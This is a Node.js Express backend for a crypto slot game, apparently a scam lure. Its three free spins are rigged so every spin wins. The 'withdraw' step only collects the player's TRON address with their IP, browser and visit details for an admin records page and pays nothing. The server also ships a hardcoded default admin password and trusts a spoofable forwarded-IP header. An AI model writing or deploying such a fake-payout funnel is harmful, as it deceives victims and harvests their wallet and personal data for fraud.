const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== 配置 =====
const DATA_DIR = path.join(__dirname, 'data');
const RECORDS_FILE = path.join(DATA_DIR, 'records.json');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
const PLAYERS_FILE = path.join(DATA_DIR, 'players.json');
const DEFAULT_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123456';
const TOKEN_TTL = 24 * 60 * 60 * 1000;

const TOTAL_SPINS = 3;
const PAYOUT_BY_MATCH = {2: 10, 3: 30, 4: 200, 5: 10000};
const MATCH_POOL = [2, 3, 4];
const SYM_IDS = ['btc', 'eth', 'sol', 'doge', 'usdt', 'trx'];

// ===== 数据初始化 =====
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(RECORDS_FILE)) fs.writeFileSync(RECORDS_FILE, '[]', 'utf8');
if (!fs.existsSync(CONFIG_FILE)) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify({ adminPassword: DEFAULT_PASSWORD }, null, 2), 'utf8');
}
if (!fs.existsSync(PLAYERS_FILE)) fs.writeFileSync(PLAYERS_FILE, '{}', 'utf8');

function readJSON(file, fallback) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch { return fallback; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}
function readRecords() { return readJSON(RECORDS_FILE, []); }
function writeRecords(r) { writeJSON(RECORDS_FILE, r); }
function readConfig() { return readJSON(CONFIG_FILE, { adminPassword: DEFAULT_PASSWORD }); }
function writeConfig(c) { writeJSON(CONFIG_FILE, c); }
function readPlayers() { return readJSON(PLAYERS_FILE, {}); }
function writePlayers(p) { writeJSON(PLAYERS_FILE, p); }

// ===== 中间件 =====
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ===== 工具函数 =====
function getClientIP(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}
function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
function shuffle(arr) {
  const a = arr.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}
function generateOutcome() {
  const match = pick(MATCH_POOL);
  const winId = pick(SYM_IDS);
  const result = new Array(5);
  const order = shuffle([0, 1, 2, 3, 4]);
  for (let i = 0; i < match; i++) result[order[i]] = winId;
  const others = shuffle(SYM_IDS.filter(id => id !== winId));
  for (let i = match; i < 5; i++) result[order[i]] = others[(i - match) % others.length];
  const counts = {};
  result.forEach(id => counts[id] = (counts[id] || 0) + 1);
  const topMatch = Math.max(...Object.values(counts));
  const payout = PAYOUT_BY_MATCH[topMatch] || 0;
  return { result, winId, match: topMatch, payout };
}

// ===== 玩家状态管理 =====
function getOrCreatePlayer(ip) {
  const players = readPlayers();
  if (!players[ip]) {
    players[ip] = {
      ip,
      spinsUsed: 0,
      balance: 0,
      pending: 0,
      canExtract: false,
      withdrawn: false,
      address: '',
      createdAt: new Date().toISOString()
    };
    writePlayers(players);
  }
  return players[ip];
}
function savePlayer(ip, data) {
  const players = readPlayers();
  players[ip] = data;
  writePlayers(players);
}

// ===== 玩家状态查询 =====
app.get('/api/player-state', (req, res) => {
  const ip = getClientIP(req);
  const p = getOrCreatePlayer(ip);
  res.json({
    spinsUsed: p.spinsUsed,
    spinsLeft: Math.max(0, TOTAL_SPINS - p.spinsUsed),
    balance: p.balance,
    canExtract: p.canExtract || p.spinsUsed >= TOTAL_SPINS,
    withdrawn: p.withdrawn,
    locked: p.withdrawn
  });
});

// ===== 旋转 =====
app.post('/api/spin', (req, res) => {
  const ip = getClientIP(req);
  const p = getOrCreatePlayer(ip);
  if (p.withdrawn) return res.status(403).json({ ok: false, error: 'locked' });
  if (p.spinsUsed >= TOTAL_SPINS) return res.status(403).json({ ok: false, error: 'no_spins' });
  if (p.pending > 0) return res.status(400).json({ ok: false, error: 'unclaimed' });

  const outcome = generateOutcome();
  p.spinsUsed += 1;
  p.pending = outcome.payout;
  if (p.spinsUsed >= TOTAL_SPINS) p.canExtract = true;
  savePlayer(ip, p);

  res.json({
    ok: true,
    result: outcome.result,
    winId: outcome.winId,
    match: outcome.match,
    payout: outcome.payout,
    spinsUsed: p.spinsUsed,
    spinsLeft: Math.max(0, TOTAL_SPINS - p.spinsUsed),
    canExtract: p.canExtract
  });
});

// ===== 领取奖金 =====
app.post('/api/claim', (req, res) => {
  const ip = getClientIP(req);
  const p = getOrCreatePlayer(ip);
  if (p.pending > 0) {
    p.balance += p.pending;
    const claimed = p.pending;
    p.pending = 0;
    savePlayer(ip, p);
    return res.json({ ok: true, claimed, balance: p.balance });
  }
  res.json({ ok: true, claimed: 0, balance: p.balance });
});

// ===== 提交提现 =====
app.post('/api/withdraw', (req, res) => {
  const ip = getClientIP(req);
  const { address, userAgent, language, visitTime } = req.body || {};
  if (!address || typeof address !== 'string' || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
    return res.status(400).json({ ok: false, error: 'invalid address' });
  }
  const p = getOrCreatePlayer(ip);
  if (p.withdrawn) return res.status(403).json({ ok: false, error: 'already_withdrawn' });
  if (p.spinsUsed < TOTAL_SPINS) return res.status(400).json({ ok: false, error: 'not_finished' });

  const now = new Date();
  const visitDate = visitTime ? new Date(visitTime) : null;
  const records = readRecords();
  records.unshift({
    address,
    balance: String(p.balance.toFixed(2)),
    time: now.toISOString(),
    time_local: now.toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }),
    visit_time: visitDate ? visitDate.toISOString() : '',
    visit_time_local: visitDate ? visitDate.toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }) : '',
    ip,
    userAgent: userAgent || '',
    language: language || ''
  });
  if (records.length > 5000) records.length = 5000;
  writeRecords(records);

  p.withdrawn = true;
  p.address = address;
  p.canExtract = false;
  savePlayer(ip, p);

  res.json({ ok: true, balance: p.balance });
});

// ===== 管理员登录 =====
const tokens = new Map();
function issueToken() {
  const token = crypto.randomBytes(24).toString('hex');
  tokens.set(token, Date.now() + TOKEN_TTL);
  return token;
}
function verifyToken(token) {
  if (!token) return false;
  const exp = tokens.get(token);
  if (!exp) return false;
  if (Date.now() > exp) { tokens.delete(token); return false; }
  return true;
}
function getTokenFromReq(req) {
  const auth = req.headers.authorization || '';
  return auth.startsWith('Bearer ') ? auth.slice(7) : '';
}

app.post('/api/login', (req, res) => {
  const { password } = req.body || {};
  const config = readConfig();
  if (password !== config.adminPassword) return res.status(401).json({ ok: false, error: 'wrong password' });
  res.json({ token: issueToken() });
});

app.get('/api/records', (req, res) => {
  const token = getTokenFromReq(req);
  if (!verifyToken(token)) return res.status(401).json({ ok: false, error: 'unauthorized' });
  res.json({ records: readRecords() });
});

app.post('/api/change-password', (req, res) => {
  const token = getTokenFromReq(req);
  if (!verifyToken(token)) return res.status(401).json({ ok: false, error: 'unauthorized' });
  const { oldPassword, newPassword } = req.body || {};
  if (!oldPassword || !newPassword) return res.status(400).json({ ok: false, error: 'missing fields' });
  if (newPassword.length < 6) return res.status(400).json({ ok: false, error: 'password too short' });
  const config = readConfig();
  if (oldPassword !== config.adminPassword) return res.status(401).json({ ok: false, error: 'wrong old password' });
  config.adminPassword = newPassword;
  writeConfig(config);
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
